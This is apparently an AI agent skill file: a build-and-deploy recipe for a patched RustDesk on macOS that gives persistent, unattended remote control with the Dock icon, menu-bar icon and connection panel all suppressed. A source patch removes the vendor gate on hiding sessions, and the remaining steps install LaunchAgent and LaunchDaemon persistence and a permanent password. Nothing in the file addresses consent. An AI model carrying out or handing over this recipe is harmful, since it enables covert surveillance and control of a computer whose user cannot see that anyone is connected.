---
name: deploy-stealth-rustdesk
description: Build a patched, fully-stealth RustDesk from source and deploy it as an unattended macOS service — no Dock icon, no menu-bar icon, no on-screen connection panel, keyboard still works.
disable-model-invocation: true
---

# Deploy stealth RustDesk (macOS, from source)

Unattended remote access to a macOS box with **three stealth surfaces** suppressed — the **Dock icon**, the **menu-bar (tray) icon**, and the **CM panel** (the connection-management window that floats top-right during a session) — while remote **keyboard** still works.

Why build from source: the obvious shortcut — the `hide-tray=Y` custom-client flag — springs the **daemon trap**. It makes RustDesk install as a *LaunchDaemon*, which runs outside the user's GUI session and silently kills remote keyboard input ([rustdesk#10709](https://github.com/rustdesk/rustdesk/issues/10709)); on macOS 26 such clients may not even launch. The only path that is both invisible and controllable keeps RustDesk a **LaunchAgent** (user session) and just skips *drawing* the tray icon — a one-line patch.

Each surface needs a different mechanism — there is no single toggle:

| Surface | Suppressed by |
|---|---|
| Dock icon | `LSUIElement=1` — already in stock `flutter/macos/Runner/Info.plist`; no action |
| Tray / menu-bar icon | `assets/stealth.patch` → `src/tray.rs` (Step 2) |
| CM connection panel | `assets/stealth.patch` → `src/ipc.rs` un-gates the feature, **then** config turns it on (Step 7) |

Upstream restricts the hide-CM feature to Pro / custom-client builds (`is_custom_client()` is just `get_app_name() != "RustDesk"`), so on a vanilla from-source build no config value alone will hide the CM panel — the patch removes that gate.

**Pins — RustDesk 1.4.8, Apple Silicon.** Version drift is the top build-failure cause; match exactly. For any other tag, re-derive them first (`reference/recovery.md` → "Re-deriving pins").

- Rust `1.81` · Flutter `3.24.5` (exact) · vcpkg `@120deac3062162151622ca4860575a33844ba10b` · cargo-expand `1.0.95` · flutter_rust_bridge_codegen `1.80.1`
- vcpkg triplet `arm64-osx` · build features `flutter,hwcodec,unix-file-copy-paste` · **full Xcode** (not just Command Line Tools)

Set once, used throughout (`$SKILL_DIR` = this skill's folder):

```bash
BUILD=~/rustdesk-build
export VCPKG_ROOT="$BUILD/vcpkg"
export PATH="$BUILD/flutter-sdk/flutter/bin:$HOME/.cargo/bin:$PATH"
APP="$BUILD/rustdesk/flutter/build/macos/Build/Products/Release/RustDesk.app"
```

## Step 1 — Pin the toolchain

Install/verify every pin above. Full Xcode must be the active developer dir:
`sudo xcode-select -s /Applications/Xcode.app/Contents/Developer && sudo xcodebuild -license accept && sudo xcodebuild -runFirstLaunch`.
`rustup install 1.81`; download Flutter **3.24.5** exact from the Flutter release archive (NOT `brew install flutter` — that is latest and will break codegen); `brew install nasm cmake pkg-config cocoapods`; clone vcpkg, `git checkout` the pinned commit, `./bootstrap-vcpkg.sh -disableMetrics`; `cargo +1.81 install cargo-expand --version 1.0.95 --locked` and `cargo +1.81 install flutter_rust_bridge_codegen --version 1.80.1 --features uuid --locked`.

**Done when:** `flutter doctor` shows Xcode ✓, `$VCPKG_ROOT/vcpkg version` runs, and `flutter_rust_bridge_codegen --version` prints `1.80.1`.

## Step 2 — Clone and patch

```bash
git clone --depth 1 --branch 1.4.8 --recurse-submodules --shallow-submodules \
  https://github.com/rustdesk/rustdesk.git "$BUILD/rustdesk"
cd "$BUILD/rustdesk" && rustup override set 1.81
git apply "$SKILL_DIR/assets/stealth.patch"
```

The patch is the **only** code change — two small hunks:
- `src/tray.rs::make_tray()` — forces the tray's existing "start the event loop but don't create the status item" path on macOS. Keeping the event loop is what lets the `--server` process retain its main run loop → capture + input survive. Do **not** early-return `start_tray()` instead — the `--server` macOS branch depends on that loop.
- `src/ipc.rs` (`get_config` "hide_cm") — removes the `is_pro() || is_custom_client()` gate so `hide_cm()` is honored on this build. Without this, the Step 7 config is silently ignored and the CM panel shows on every connect.

**Done when:** `grep -rc 'STEALTH BUILD PATCH' src/tray.rs src/ipc.rs` reports `1` for each file.

## Step 3 — Generate the FRB bridge (do NOT skip)

`build.py` does not run flutter_rust_bridge codegen. Skip this and Step 4 fails with `file not found for module bridge_generated` + `EventToUI: IntoIntoDart` errors that look unrelated to the real cause.

```bash
cd "$BUILD/rustdesk/flutter" && flutter pub get && cd ..
flutter_rust_bridge_codegen --rust-input ./src/flutter_ffi.rs \
  --dart-output ./flutter/lib/generated_bridge.dart \
  --c-output ./flutter/macos/Runner/bridge_generated.h
```

**Done when:** `src/bridge_generated.rs` exists (~5k lines). Its absence is the single most common reason the build "mysteriously" fails at Step 4 — verify the file before moving on.

## Step 4 — Build

```bash
cd "$BUILD/rustdesk"
MACOSX_DEPLOYMENT_TARGET=10.14 python3 build.py --flutter --hwcodec --unix-file-copy-paste
```

These are the exact features of the official 1.4.8 macOS release, so the result differs from stock only by the tray patch. First build is 30–60 min (vcpkg compiles aom/ffmpeg).

**Done when:** `"$APP/Contents/MacOS/RustDesk" --version` prints `1.4.8`.

## Step 5 — Codesign

`build.py` copies the `service` binary in *after* Xcode signs, so re-sign the whole bundle. Sign in the build dir (writable) **before** installing; re-signing the copy already in `/Applications` needs `sudo` (it is root-owned — without it, nested dylibs fail with `nested code is modified or invalid`).

```bash
codesign --force --deep --sign - "$APP"
```

Ad-hoc (`-s -`) works, but it binds the Step 8 TCC grants to this exact binary: **every rebuild changes the cdhash and silently breaks them** (symptom `Connected, waiting for image` → reset + re-grant). If you will rebuild on RustDesk updates, sign with a **stable self-signed identity** instead so grants survive rebuilds — see `reference/recovery.md` → "Stable signing identity".

**Done when:** `codesign --verify --deep --strict "$APP"` passes and prints "satisfies its Designated Requirement".

## Step 6 — Install as LaunchAgent + daemon

Copy to `/Applications`, install both plists from the repo (root:wheel), load the root daemon, bootstrap the user agent into the GUI session:

```bash
sudo rm -rf /Applications/RustDesk.app && sudo cp -R "$APP" /Applications/RustDesk.app
sudo chown -R root:wheel /Applications/RustDesk.app
S="$BUILD/rustdesk/src/platform/privileges_scripts"
sudo cp "$S/daemon.plist" /Library/LaunchDaemons/com.carriez.RustDesk_service.plist
sudo cp "$S/agent.plist"  /Library/LaunchAgents/com.carriez.RustDesk_server.plist
sudo chown root:wheel /Library/LaunchDaemons/com.carriez.RustDesk_service.plist /Library/LaunchAgents/com.carriez.RustDesk_server.plist
sudo launchctl load -w /Library/LaunchDaemons/com.carriez.RustDesk_service.plist
launchctl bootstrap gui/$(id -u) /Library/LaunchAgents/com.carriez.RustDesk_server.plist
```

The **agent** (`RustDesk --server`, runs in the Aqua/LoginWindow session) is what makes keyboard injection work — this is the whole point of not being a daemon-only install.

**Done when:** `launchctl print gui/$(id -u)/com.carriez.RustDesk_server` and `sudo launchctl print system/com.carriez.RustDesk_service` both show `state = running`.

## Step 7 — Password, identity sync, hide the CM panel

Order matters — the password IPC needs the service running; the config edits need it stopped.

```bash
# 1. permanent password (needs root + installed):
sudo /Applications/RustDesk.app/Contents/MacOS/RustDesk --password 'YOUR_STRONG_PASSWORD'   # -> "Done!"
# 2. stop both so edits are not overwritten:
launchctl bootout gui/$(id -u)/com.carriez.RustDesk_server; sudo launchctl bootout system/com.carriez.RustDesk_service
# 3. sync identity+password daemon(root) -> agent(user) so enc_id/key match:
sudo cp /var/root/Library/Preferences/com.carriez.RustDesk/RustDesk.toml  ~/Library/Preferences/com.carriez.RustDesk/RustDesk.toml
sudo cp /var/root/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml ~/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml
sudo chown $(id -u):$(id -g) ~/Library/Preferences/com.carriez.RustDesk/RustDesk*.toml
# 4. hide the CM panel — all 3 required (and are the correct unattended posture) — in BOTH configs' [options] (last section, so append is safe):
for f in /var/root/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml ~/Library/Preferences/com.carriez.RustDesk/RustDesk2.toml; do
  printf "approve-mode = 'password'\nverification-method = 'use-permanent-password'\nallow-hide-cm = 'Y'\n" | sudo tee -a "$f" >/dev/null
done
# 5. restart both:
sudo launchctl load -w /Library/LaunchDaemons/com.carriez.RustDesk_service.plist
launchctl bootstrap gui/$(id -u) /Library/LaunchAgents/com.carriez.RustDesk_server.plist
```

`hide_cm()` requires all three: `approve-mode=password` **and** `verification-method=use-permanent-password` **and** `allow-hide-cm=Y` — and they only take effect because Step 2's `ipc.rs` hunk removed the Pro/custom-client gate; on a stock build these are silently ignored. The permanent password is stored (hashed) in the `password` field of `RustDesk.toml`, not RustDesk2.toml.

**Done when:** root and user `RustDesk.toml` have the same `enc_id`, and both `RustDesk2.toml` carry the three options.

## Step 8 — Grant permissions (manual, unavoidable)

macOS forbids scripting TCC. Over a GUI session (VNC / Screen Sharing / console), grant **RustDesk** in System Settings ▸ Privacy & Security: **Screen & System Audio Recording**, **Accessibility**, **Input Monitoring**. Then restart both services so they pick up the grants:
`launchctl kickstart -k gui/$(id -u)/com.carriez.RustDesk_server && sudo launchctl kickstart -k system/com.carriez.RustDesk_service`.

**Done when:**
```bash
sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
  "select service,auth_value from access where client='com.carriez.rustdesk';"
```
lists `kTCCServiceScreenCapture`, `kTCCServiceAccessibility`, `kTCCServiceListenEvent` all `= 2`.

**Rebuild redeploys (ad-hoc signing):** the old grants are bound to the previous signature — they still read `= 2` but silently fail (`Connected, waiting for image`). `sudo tccutil reset ScreenCapture com.carriez.rustdesk` (+ `Accessibility`, `ListenEvent`), restart both labels, re-grant. A stable signing identity (Step 5) avoids this.

## Step 9 — Verify the payoff (all must hold)

- **Stealth:** `lsappinfo list | grep -iA2 rustdesk` shows the `--server` process as `type="UIElement"` (no Dock icon); the menu bar has no RustDesk item; connecting shows no floating panel.
- **Function (from a second machine):** connect to the ID (`/Applications/RustDesk.app/Contents/MacOS/RustDesk --get-id`) with the password → screen appears, mouse works, and **keyboard works**.
- **Persistence:** reboot with nobody logged in → reconnect succeeds.

Keyboard working is the criterion that proves the whole approach — if it fails you are in the **daemon trap** (the agent is not running in the user session). See `reference/recovery.md`.

## Maintenance & rollback

On a RustDesk version bump, to uninstall, or to debug a failed build/connection, see **`reference/recovery.md`**.
